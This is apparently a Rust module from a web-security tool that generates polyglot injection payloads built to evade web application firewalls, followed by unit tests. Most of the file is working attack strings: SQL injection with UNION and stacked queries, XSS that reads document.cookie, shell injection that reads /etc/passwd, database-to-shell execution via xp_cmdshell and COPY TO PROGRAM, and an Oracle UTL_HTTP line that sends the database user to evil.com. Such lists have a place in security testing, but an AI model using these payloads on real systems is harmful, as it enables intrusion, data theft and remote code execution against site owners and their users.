//! Polyglot payload generator — payloads valid across multiple contexts.
//!
//! Combines delimiter-sets from multiple payload types to create cross-context
//! bypasses (e.g., SQL + XSS, CMD + XSS, SSTI + XSS). These exploit WAFs that
//! only classify a payload as one type and only apply rules for that type —
//! a polyglot triggers in whichever context the application actually uses.

/// A polyglot payload with metadata.
#[derive(Debug, Clone)]
pub struct PolyglotPayload {
    /// The polyglot payload string.
    pub payload: String,
    /// Which contexts this payload is valid in.
    pub contexts: Vec<&'static str>,
    /// Human-readable description.
    pub description: String,
}

/// Generate SQL + XSS polyglot payloads.
fn sql_xss_polyglots() -> Vec<PolyglotPayload> {
    vec![
        PolyglotPayload {
            payload: "' OR '1'='1' -- <script>alert(1)</script>".into(),
            contexts: vec!["sql", "xss"],
            description: "SQL tautology + XSS script tag".into(),
        },
        PolyglotPayload {
            payload: "' UNION SELECT '<img src=x onerror=alert(1)>'-- ".into(),
            contexts: vec!["sql", "xss"],
            description: "UNION SELECT injecting XSS vector".into(),
        },
        PolyglotPayload {
            payload: "1' AND 1=1 AND '<svg onload=alert(1)>'='".into(),
            contexts: vec!["sql", "xss"],
            description: "AND-balanced XSS inside SQL string".into(),
        },
        PolyglotPayload {
            payload: "'-confirm(1)-'".into(),
            contexts: vec!["sql", "xss"],
            description: "SQL string break + JS confirm as arithmetic".into(),
        },
        PolyglotPayload {
            payload: "'\"-->]]>*/</script><svg onload=alert(1)>".into(),
            contexts: vec!["sql", "xss", "html"],
            description: "Multi-context escape: SQL + HTML comment + CDATA + script close".into(),
        },
        PolyglotPayload {
            payload: "' UNION SELECT null,concat('<svg/onload=alert(1)>')--".into(),
            contexts: vec!["sql", "xss"],
            description: "UNION with concat() producing XSS in reflected output".into(),
        },
        PolyglotPayload {
            payload: "1;SELECT '<img src=x onerror=alert(document.cookie)>'--".into(),
            contexts: vec!["sql", "xss"],
            description: "Stacked query injecting XSS into result set".into(),
        },
    ]
}

/// Generate CMD + XSS polyglot payloads.
fn cmd_xss_polyglots() -> Vec<PolyglotPayload> {
    vec![
        PolyglotPayload {
            payload: "; echo <script>alert(1)</script>".into(),
            contexts: vec!["cmd", "xss"],
            description: "CMD echo + XSS script tag".into(),
        },
        PolyglotPayload {
            payload: "| cat /etc/passwd; echo '<img src=x onerror=alert(1)>'".into(),
            contexts: vec!["cmd", "xss"],
            description: "CMD pipeline + XSS img tag".into(),
        },
        PolyglotPayload {
            payload: "`echo <svg onload=alert(1)>`".into(),
            contexts: vec!["cmd", "xss"],
            description: "Backtick CMD execution with SVG XSS".into(),
        },
        PolyglotPayload {
            payload: "$(echo '<details open ontoggle=alert(1)>')".into(),
            contexts: vec!["cmd", "xss"],
            description: "Subshell echo with details/ontoggle XSS".into(),
        },
        PolyglotPayload {
            payload: "& echo '<body onload=alert(1)>' &".into(),
            contexts: vec!["cmd", "xss"],
            description: "Background CMD with body onload XSS".into(),
        },
    ]
}

/// Generate SSTI + XSS polyglot payloads.
fn ssti_xss_polyglots() -> Vec<PolyglotPayload> {
    vec![
        PolyglotPayload {
            payload: "{{'<script>alert(1)</script>'}}".into(),
            contexts: vec!["ssti", "xss"],
            description: "Jinja2 string literal containing XSS".into(),
        },
        PolyglotPayload {
            payload: "${'<img src=x onerror=alert(1)>'}".into(),
            contexts: vec!["ssti", "xss"],
            description: "Freemarker literal containing XSS img".into(),
        },
        PolyglotPayload {
            payload: "<%= \"<svg onload=alert(1)>\" %>".into(),
            contexts: vec!["ssti", "xss"],
            description: "ERB expression containing SVG XSS".into(),
        },
        PolyglotPayload {
            payload: "{{constructor.constructor('alert(1)')()}}".into(),
            contexts: vec!["ssti", "xss"],
            description: "Angular sandbox escape via prototype chain".into(),
        },
        PolyglotPayload {
            payload: "${7*7}<img src=x onerror=alert(1)>".into(),
            contexts: vec!["ssti", "xss"],
            description: "SSTI probe + XSS — WAF must detect both".into(),
        },
    ]
}

/// Generate SQL + CMD polyglot payloads.
fn sql_cmd_polyglots() -> Vec<PolyglotPayload> {
    vec![
        PolyglotPayload {
            payload: "'; EXEC xp_cmdshell('whoami')--".into(),
            contexts: vec!["sql", "cmd"],
            description: "MSSQL xp_cmdshell via stacked query".into(),
        },
        PolyglotPayload {
            payload: "' UNION SELECT LOAD_FILE('/etc/passwd')--".into(),
            contexts: vec!["sql", "cmd"],
            description: "MySQL LOAD_FILE for filesystem access".into(),
        },
        PolyglotPayload {
            payload: "'; COPY (SELECT '') TO PROGRAM 'id'--".into(),
            contexts: vec!["sql", "cmd"],
            description: "PostgreSQL COPY TO PROGRAM for RCE".into(),
        },
        PolyglotPayload {
            payload: "' || UTL_HTTP.REQUEST('http://evil.com/'||user)--".into(),
            contexts: vec!["sql", "ssrf"],
            description: "Oracle UTL_HTTP for SSRF via SQL injection".into(),
        },
    ]
}

/// Generate universal polyglots that work across 3+ contexts.
fn universal_polyglots() -> Vec<PolyglotPayload> {
    vec![
        PolyglotPayload {
            payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )///%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e".into(),
            contexts: vec!["xss", "html", "javascript", "url"],
            description: "Gareth Heyes universal XSS polyglot — works across HTML/JS/URL contexts".into(),
        },
        PolyglotPayload {
            payload: "'\"-->]]>*/</script></style></title></textarea><svg onload=alert(1)>".into(),
            contexts: vec!["xss", "html", "sql", "ssti"],
            description: "Multi-context escape sequence — breaks out of SQL strings, HTML tags, CDATA, script, style, title, textarea".into(),
        },
        PolyglotPayload {
            payload: "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}".into(),
            contexts: vec!["ssti", "jinja2", "freemarker", "erb", "twig"],
            description: "Universal SSTI probe — Jinja2 + Freemarker + ERB + Twig + Ruby".into(),
        },
        PolyglotPayload {
            payload: "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>".into(),
            contexts: vec!["xss", "html", "javascript"],
            description: "Multi-quote-context XSS — works inside single, double, or no quotes".into(),
        },
    ]
}

/// Generate all polyglot payloads.
#[must_use]
pub fn all_polyglots() -> Vec<PolyglotPayload> {
    let mut results = Vec::new();
    results.extend(sql_xss_polyglots());
    results.extend(cmd_xss_polyglots());
    results.extend(ssti_xss_polyglots());
    results.extend(sql_cmd_polyglots());
    results.extend(universal_polyglots());
    results
}

/// Generate polyglot payloads filtered by context.
#[must_use]
pub fn polyglots_for(context: &str) -> Vec<String> {
    all_polyglots()
        .into_iter()
        .filter(|p| p.contexts.contains(&context))
        .map(|p| p.payload)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sql_xss_polyglots_exist() {
        let polyglots = polyglots_for("sql");
        assert!(polyglots.len() >= 7, "should have at least 7 SQL polyglots, got {}", polyglots.len());
        assert!(polyglots.iter().any(|p| p.contains("<script>") || p.contains("<svg") || p.contains("<img")));
    }

    #[test]
    fn cmd_xss_polyglots_exist() {
        let polyglots = polyglots_for("cmd");
        assert!(polyglots.len() >= 5, "should have at least 5 CMD polyglots");
        assert!(polyglots.iter().any(|p| p.contains("echo")));
    }

    #[test]
    fn ssti_xss_polyglots_exist() {
        let polyglots = polyglots_for("ssti");
        assert!(polyglots.len() >= 5, "should have at least 5 SSTI polyglots");
        assert!(
            polyglots
                .iter()
                .any(|p| p.contains("{{") || p.contains("${"))
        );
    }

    #[test]
    fn all_polyglots_have_contexts() {
        for p in all_polyglots() {
            assert!(
                !p.contexts.is_empty(),
                "polyglot must declare at least one context"
            );
        }
    }

    #[test]
    fn universal_polyglots_cover_multiple_contexts() {
        let universals = universal_polyglots();
        for p in &universals {
            assert!(p.contexts.len() >= 2, "universal polyglots should cover 2+ contexts: {:?}", p.contexts);
        }
    }

    #[test]
    fn sql_cmd_polyglots_exist() {
        let polyglots = sql_cmd_polyglots();
        assert!(polyglots.len() >= 3, "should have SQL+CMD polyglots");
    }

    #[test]
    fn total_polyglot_count() {
        let all = all_polyglots();
        assert!(all.len() >= 25, "should have at least 25 total polyglots, got {}", all.len());
    }

    #[test]
    fn polyglots_for_unknown_context_empty() {
        let polyglots = polyglots_for("nonexistent");
        assert!(polyglots.is_empty());
    }
}
